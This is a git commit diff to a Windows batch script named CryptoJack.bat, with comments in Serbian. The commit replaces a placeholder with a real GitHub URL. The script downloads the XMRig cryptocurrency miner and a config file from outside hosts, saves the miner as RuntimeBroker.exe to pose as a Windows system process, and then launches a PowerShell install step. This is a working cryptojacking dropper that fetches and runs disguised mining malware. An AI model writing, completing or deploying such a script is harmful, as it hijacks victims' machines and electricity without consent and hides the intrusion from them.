d51880c3554f574836c631009e431cac227dd272
Djokaj100 <164801869+Djokaj100@users.noreply.github.com>
2026-06-17 16:17:33 +0200

    Update CryptoJack.bat

--- CryptoJack.bat
+++ CryptoJack.bat
@@ -1,6 +1,6 @@
 @echo off
 :: Preuzimanje rudara i konfiguracije sa tvog GitHub-a
-powershell -Command "(New-Object System.Net.WebClient).DownloadFile('TVOJ_RAW_LINK_KA_XMRIG', '%~dp0RuntimeBroker.exe')"
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/Djokaj100/test-miner-projekt/raw/refs/heads/main/xmrig.exe', '%~dp0RuntimeBroker.exe')"
 powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Djokaj100/test-miner-projekt/refs/heads/main/config.json', '%~dp0config.json')"
 
 :: Pokretanje PowerShell skripte za instalaciju/izvrsavanje
